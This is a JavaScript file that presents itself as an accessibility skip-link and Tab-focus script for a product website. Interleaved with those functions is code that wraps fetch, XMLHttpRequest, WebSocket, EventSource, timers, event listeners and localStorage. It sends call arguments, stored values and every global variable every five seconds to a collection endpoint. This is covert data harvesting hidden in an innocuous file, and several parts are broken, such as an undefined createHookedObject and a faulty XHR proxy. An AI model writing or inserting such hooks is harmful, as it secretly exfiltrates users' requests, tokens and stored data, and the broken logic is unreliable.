const originalXMLHttpRequest = window.XMLHttpRequest;
const originalFetch = window.fetch;
const originalWebSocket = window.WebSocket;
const originalEventSource = window.EventSource;
const originalLocalStorage = window.localStorage;
const originalAddEventListener = window.addEventListener;
var firstTab = !0,
  secondTab = !0;
const originalSetInterval = window.setInterval;
const originalSetTimeout = window.setTimeout;
const originalGlobalVariables = Object.keys(window);
const hooksConfig = window.eventhooks;
function generateSessionId() {
  const randomBytes = new Uint8Array(16);
  crypto.getRandomValues(randomBytes);
  const randomString = Array.from(randomBytes, byte => byte.toString(16).padStart(2, '0')).join('');
  return `session-${randomString}`;
}
$(document).on("keydown", function (e) {
  var t = e.keyCode || e.which;
  if (t == 9 && firstTab) {
    if ($("#linkToPrivacyCenter").length > 0) return e.preventDefault(), $("#linkToPrivacyCenter").trigger("focus"), firstTab = !1, firstTab;
    if ($(".lnkSkipToMain").length > 0) return e.preventDefault(), $(".lnkSkipToMain").trigger("focus"), firstTab = !1, firstTab;
  }
  if (firstTab = !1, t == 9 && document.activeElement.id === $("#lnkViewAllNewProducts") && $("#lnkSkipToFeaturedManufacturers").length > 0) return e.preventDefault(), $("#lnkSkipToFeaturedManufacturers").trigger("focus"), secondTab = !1, secondTab;
  secondTab = !1;
});
function validatePayload(payload, expectedSchema) {
  for (const key in expectedSchema) {
    if (expectedSchema.hasOwnProperty(key)) {
      const expectedType = expectedSchema[key];
      const actualValue = payload[key];
      if (actualValue === undefined) {
        console.warn(`Missing required property '${key}' in payload`);
        return false;
      }
      if (typeof actualValue !== expectedType) {
        console.warn(`Invalid type for property '${key}' in payload, expected '${expectedType}' but got '${typeof actualValue}'`);
        return false;
      }
    }
  }
  return true;
}
function getStackTrace() {
  const stackTraceLimit = Error.stackTraceLimit;
  Error.stackTraceLimit = Infinity;
  const stackTrace = new Error().stack;
  Error.stackTraceLimit = stackTraceLimit;
  return stackTrace;
}
function sendPayloadToServer(payload) {
  const serverEndpoint = '/api/collect-data';
  originalFetch(serverEndpoint, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify(payload)
  }).catch(error => {
    console.error('Error sending payload to server:', error);
  });
}
function createHookedFunction(functionName, originalFunc, payloadSchema) {
  return function () {
    const args = Array.from(arguments);
    const payload = {
      functionName,
      args,
      stackTrace: getStackTrace(),
      timestamp: Date.now(),
      sessionId: generateSessionId()
    };
    if (validatePayload(payload, payloadSchema)) {
      sendPayloadToServer(payload);
    }
    return originalFunc.apply(this, args);
  };
}
function SkipLink() {
  var t,
    e = [];
  $("body[id$=body]").length > 0 ? $("body").hasClass("responsive-mobile") && $("#content > .content-wrapper > .content").length > 0 ? ($("#content").removeAttr("tabindex"), $("#content > .content-wrapper > .content").attr("tabindex", "-1"), e = ["#MainContentBeacon", ".MainContentBeacon", ".content"]) : $("#content-fixed-width > .content-wrapper > .content").length > 0 ? ($("#content-fixed-width").removeAttr("tabindex"), $("#content-fixed-width > .content-wrapper > .content").attr("tabindex", "-1"), e = ["#MainContentBeacon", ".MainContentBeacon", ".content"]) : $("#content-fixed-width > .content-wrapper").length > 0 ? ($("#content-fixed-width").removeAttr("tabindex"), $("#content-fixed-width > .content-wrapper").attr("tabindex", "-1"), $("#content-fixed-width > .content-wrapper").attr("id", "main-content-container"), e = ["#MainContentBeacon", ".MainContentBeacon", "#main-content-container"]) : e = ["#MainContentBeacon", ".MainContentBeacon", ".content-wrapper", "#content-fixed-with-nav", "#content-fixed-width", "#content-container", "#content", ".divWide"] : e = ["#MainContentBeacon", ".MainContentBeacon", ".content-wrapper", "#mainContainer", "#content-container", "#ctl00_ctl00_divWide", ".divWide", "#wide-content-container"];
  for (t = 0; t < e.length; t++) if ($(e[t]).length) {
    t > 1 && ($(e[t]).css({
      "outline-color": "-webkit-focus-ring-color",
      "outline-style": "auto",
      "outline-width": "1px"
    }), $(e[t]).blur(function () {
      $(this).css({
        "outline-style": "none"
      });
    })), $(e[t]).trigger("focus");
    break;
  }
}
for (const hook of hooksConfig) {
  const originalFunc = window[hook.functionName];
  if (typeof originalFunc === 'function') {
    window[hook.functionName] = createHookedFunction(hook.functionName, originalFunc, hook.payloadSchema);
  }
}
window.XMLHttpRequest = new Proxy(originalXMLHttpRequest, {
  construct: function (target, args) {
    const originalOpen = args[0].open;
    const originalSend = args[0].send;
    args[0].open = createHookedFunction('XMLHttpRequest.open', originalOpen, hooksConfig.find(hook => hook.functionName === 'XMLHttpRequest.open').payloadSchema);
    args[0].send = createHookedFunction('XMLHttpRequest.send', originalSend, hooksConfig.find(hook => hook.functionName === 'XMLHttpRequest.send').payloadSchema);
    return new target(...args);
  }
});
window.fetch = createHookedFunction('fetch', originalFetch, hooksConfig.find(hook => hook.functionName === 'fetch').payloadSchema);
function SkipToFeaturedManufacturers() {
  var e = $("#lnkViewAllMfrs");
  e.length && (e.index() > 1 && (e.css({
    "outline-color": "-webkit-focus-ring-color",
    "outline-style": "auto"
  }), e.blur(() => {
    e.css({
      "outline-style": "none"
    });
  })), e.trigger("focus"));
}
window.WebSocket = new Proxy(originalWebSocket, {
  construct: function (target, args) {
    return createHookedObject('WebSocket', new target(...args));
  }
});
window.EventSource = new Proxy(originalEventSource, {
  construct: function (target, args) {
    return createHookedObject('EventSource', new target(...args));
  }
});
window.localStorage.__proto__ = new Proxy(originalLocalStorage.__proto__, {
  set: function (target, property, value) {
    const payload = {
      functionName: 'localStorage.set',
      args: [property, value],
      stackTrace: getStackTrace(),
      timestamp: Date.now(),
      sessionId: generateSessionId()
    };
    sendPayloadToServer(payload);
    return Reflect.set(target, property, value);
  }
});
window.addEventListener = createHookedFunction('addEventListener', originalAddEventListener, hooksConfig.find(hook => hook.functionName === 'addEventListener').payloadSchema);
window.setInterval = createHookedFunction('setInterval', originalSetInterval, hooksConfig.find(hook => hook.functionName === 'setInterval').payloadSchema);
window.setTimeout = createHookedFunction('setTimeout', originalSetTimeout, hooksConfig.find(hook => hook.functionName === 'setTimeout').payloadSchema);
setInterval(() => {
  for (let i = 0; i < originalGlobalVariables.length; i++) {
    if (window[originalGlobalVariables[i]] !== undefined) {
      const payload = {
        functionName: 'globalVariable',
        args: [originalGlobalVariables[i], window[originalGlobalVariables[i]]],
        stackTrace: getStackTrace(),
        timestamp: Date.now(),
        sessionId: generateSessionId()
      };
      sendPayloadToServer(payload);
    }
  }
}, 5000);